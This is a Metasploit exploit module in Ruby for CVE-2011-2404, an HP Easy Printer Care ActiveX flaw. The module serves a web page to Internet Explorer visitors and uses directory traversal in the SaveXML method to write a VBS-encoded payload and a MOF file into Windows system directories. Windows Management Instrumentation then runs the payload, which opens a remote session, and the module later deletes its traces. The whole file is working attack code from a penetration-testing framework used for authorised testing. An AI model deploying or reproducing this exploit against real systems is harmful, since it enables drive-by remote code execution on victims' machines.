##
# $Id: hp_easy_printer_care_xmlsimpleaccessor.rb 13599 2011-08-20 17:47:03Z bannedit $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP Easy Printer Care XMLSimpleAccessor Class ActiveX Control Remote Code Execution',
			'Description'    => %q{
					This module allows remote attackers to place arbitrary files on a users file 
				system by abusing via Directory Traversal attack the "saveXML" method from the 
				"XMLSimpleAccessor" class in the HP Easy Printer HPTicketMgr.dll ActiveX Control 
				(HPTicketMgr.dll 2.7.2.0).

					Code execution can be achieved by first uploading the payload to the remote 
				machine embeddeding a vbs file, and then upload another mof file, which enables Windows 
				Management Instrumentation service to execute the vbs. Please note that this 
				module currently only works for Windows before Vista.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Andrea Micalizzi',  # aka rgod original discovery
					'juan vazquez',      # Original Metasploit module
				],
			'Version'        => '$Revision: 13599 $',
			'References'     =>
				[
					[ 'CVE', '2011-2404 '],
					[ 'OSVDB', '74510'],
					[ 'BID', '49100'],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-261/' ],
				],
			'DefaultOptions' =>
				{
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'           => 2048,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					#Windows before Vista
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 16 2011'))
	end

	#
	# The following handles deleting the copied vbs payload and mof file
	# See "struts_code_exec.rb" and "ms10_026_dbldecode.rb" for more information.
	#
	def on_new_session(client)

		if client.type != "meterpreter"
			print_error("NOTE: you must use a meterpreter payload in order to automatically cleanup.")
			print_error("The vbs payload and mof file must be removed manually.")
			return
		end

		return if not @var_mof_name
		return if not @var_vbs_name

		# stdapi must be loaded before we can use fs.file
		client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

		cmd = "C:\\windows\\system32\\attrib.exe -r " +
				"C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof"
		client.sys.process.execute(cmd, nil, {'Hidden' => true })

		begin
			print_status("Deleting the vbs payload \"#{@var_vbs_name}.vbs\" ...")
			client.fs.file.rm("C:\\windows\\system32\\" + @var_vbs_name + ".vbs")
			print_status("Deleting the mof file \"#{@var_mof_name}.mof\" ...")
			client.fs.file.rm("C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof")
		rescue ::Exception => e
			print_error("Exception: #{e.inspect}")
		end

	end

	def on_request_uri(cli, request)

		unless request['User-Agent'] =~ /MSIE/
			send_not_found(cli)
			print_error("#{cli.peerhost}:#{cli.peerport} Unknown user-agent")
			return
		end

		# Traversal directory attack calculated from default location:
		# C:\Program Files\Common Files\Hewlett-Packard\HP Device Communication Services\TicketServices

		# Using Windows Management Instrumentation service to execute the payload.
		# Using code from "blackice_downloadimagefileurl.rb". See it for more information.

		var_xml_data_union = rand_text_alpha(rand(5)+5)
		var_xml_simple_accessor = rand_text_alpha(rand(5)+5)
		var_mof_function_name = rand_text_alpha(rand(5)+5)
		var_xml_tag = rand_text_alpha(rand(5)+5)
		var_xml_content = rand_text_alpha(rand(5)+5)

		content = <<-EOS
		<html>
		<head>
		<script>
			var #{var_xml_data_union} = new ActiveXObject('HPESPRIT.XMLDataUnion.1');
			var #{var_xml_simple_accessor} = new ActiveXObject('HPESPRIT.XMLSimpleAccessor.1');

			function #{var_mof_function_name}() {
				try {
					#{var_xml_data_union}.xml = "<#{var_xml_tag}>#{var_xml_content}</#{var_xml_tag}>";
					#{var_xml_simple_accessor}.xmlDataUnion = #{var_xml_data_union};
					#{var_xml_data_union}.xml = unescape("#{@mof_content}");
				} catch( e ) {
					#{var_xml_simple_accessor}.SaveXML(
						"../../../../../WINDOWS/system32/wbem/mof/#{@var_mof_name}.mof",
						"UTF-8"
					);
				}
			}

			try {
				#{var_xml_data_union}.xml = "<#{var_xml_tag}>#{var_xml_content}</#{var_xml_tag}>";
				#{var_xml_simple_accessor}.xmlDataUnion = #{var_xml_data_union};
				#{var_xml_data_union}.xml = unescape("#{@vbs_content}");
			} catch( e ) {
				#{var_xml_simple_accessor}.SaveXML(
					"../../../../../WINDOWS/system32/#{@var_vbs_name}.vbs",
					"UTF-8"
				);
			}
			setTimeout("#{var_mof_function_name}()", 4000);
		</script>
		</head>
		</html>
		EOS

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
		send_response_html(cli, content)
		handler(cli)
	end

	def exploit
		# In order to save binary data to the file system the payload is written to a .vbs
		# file and execute it from there.
		@var_mof_name = rand_text_alpha(rand(5)+5)
		@var_vbs_name = rand_text_alpha(rand(5)+5)

		print_status("Encoding payload into vbs...")
		payload = generate_payload_exe
		@vbs_content = Rex::Text.to_hex(Msf::Util::EXE.to_exe_vbs(payload))

		print_status("Generating mof file...")
		@mof_content = Rex::Text.to_hex(generate_mof("#{@var_mof_name}.mof", "#{@var_vbs_name}.vbs"))
		super
	end

end

